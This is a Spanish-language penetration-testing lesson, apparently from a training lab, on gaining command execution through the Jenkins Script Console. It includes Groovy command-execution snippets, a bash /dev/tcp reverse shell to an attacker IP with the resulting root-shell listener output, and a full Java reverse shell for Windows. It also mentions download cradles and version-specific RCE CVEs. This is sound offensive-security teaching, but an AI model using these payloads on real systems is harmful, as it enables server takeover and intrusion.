Hemos confirmado que el host está ejecutando Jenkins y está configurado con credenciales débiles. Vamos a verificar qué tipo de acceso nos dará esto.

Una vez que hayamos obtenido acceso a una aplicación Jenkins, una manera rápida de lograr la ejecución de comandos en el servidor subyacente es a través de la [Script Console](https://www.jenkins.io/doc/book/managing/script-console/). La consola de scripts nos permite ejecutar scripts Groovy arbitrarios dentro del runtime del controlador de Jenkins. Esto se puede abusar para ejecutar comandos del sistema operativo en el servidor subyacente. Jenkins a menudo se instala en el contexto de la cuenta root o SYSTEM, por lo que puede ser una victoria fácil para nosotros.

---

## Script Console

La consola de scripts se puede alcanzar en la URL `http://jenkins.inlanefreight.local:8000/script`. Esta consola permite a un usuario ejecutar scripts Apache [Groovy](https://en.wikipedia.org/wiki/Apache_Groovy), que es un lenguaje compatible con Java orientado a objetos. El lenguaje es similar a Python y Ruby. El código fuente de Groovy se compila en Java Bytecode y puede ejecutarse en cualquier plataforma que tenga JRE instalado.

Usando esta consola de scripts, es posible ejecutar comandos arbitrarios, funcionando de manera similar a una web shell. Por ejemplo, podemos usar el siguiente fragmento para ejecutar el comando `id`.


```r
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

`http://jenkins.inlanefreight.local:8000/script`

![](https://academy.hackthebox.com/storage/modules/113/groovy_web.png)

Hay varias formas en que el acceso a la consola de scripts puede ser aprovechado para obtener una reverse shell. Por ejemplo, usando el comando a continuación, o [este](https://web.archive.org/web/20230326230234/https://www.rapid7.com/db/modules/exploit/multi/http/jenkins_script_console/) módulo de Metasploit.


```r
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

La ejecución de los comandos anteriores resulta en una conexión reverse shell.


```r
nc -lvnp 8443

listening on [any] 8443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 57844

id

uid=0(root) gid=0(root) groups=0(root)

/bin/bash -i

root@app02:/var/lib/jenkins3#
```

Contra un host Windows, podríamos intentar agregar un usuario y conectarnos al host a través de RDP o WinRM o, para evitar hacer un cambio en el sistema, usar un PowerShell download cradle con [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1). Podríamos ejecutar comandos en una instalación de Jenkins basada en Windows usando este fragmento:


```r
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

También podríamos usar [esta](https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy) reverse shell en Java para obtener ejecución de comandos en un host Windows, intercambiando `localhost` y el puerto por nuestra dirección IP y puerto de escucha.


```r
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

---

## Miscellaneous Vulnerabilities

Existen varias vulnerabilidades de ejecución remota de código en diversas versiones de Jenkins. Un exploit reciente combina dos vulnerabilidades, CVE-2018-1999002 y [CVE-2019-1003000](https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266) para lograr ejecución de código remoto preautenticado, evitando la protección de sandbox de seguridad de scripts durante la compilación de scripts. Existen PoCs públicos de exploit para aprovechar una falla en el enrutamiento dinámico de Jenkins para evitar la ACL Overall / Read y usar Groovy para descargar y ejecutar un archivo JAR malicioso. Esta falla permite a los usuarios con permisos de lectura evitar las protecciones del sandbox y ejecutar código en el servidor maestro de Jenkins. Este exploit funciona contra Jenkins versión 2.137.

Otra vulnerabilidad existe en Jenkins 2.150.2, que permite a los usuarios con privilegios de creación de JOB y BUILD ejecutar código en el sistema a través de Node.js. Esta vulnerabilidad requiere autenticación, pero si los usuarios anónimos están habilitados, el exploit tendrá éxito porque estos usuarios tienen privilegios de creación de JOB y BUILD por defecto.

Como hemos visto, obtener acceso a Jenkins como administrador puede llevar rápidamente a la ejecución remota de código. Si bien existen varios exploits RCE que funcionan para Jenkins, son específicos de la versión. Al momento de escribir esto, la versión LTS actual de Jenkins es 2.303.1, que corrige las dos fallas detalladas anteriormente. Como con cualquier aplicación o sistema, es importante endurecer Jenkins tanto como sea posible ya que la funcionalidad incorporada puede ser fácilmente utilizada para tomar el control del servidor subyacente.

---

## Shifting Gears

Hemos cubierto varias formas en que los CMS populares y los contenedores/ aplicaciones de desarrollo de software pueden ser abusados para explotar tanto vulnerabilidades conocidas como funcionalidad incorporada. Cambiemos nuestro enfoque un poco a dos herramientas bien conocidas de monitoreo de infraestructura/red: Splunk y PRTG Network Monitor.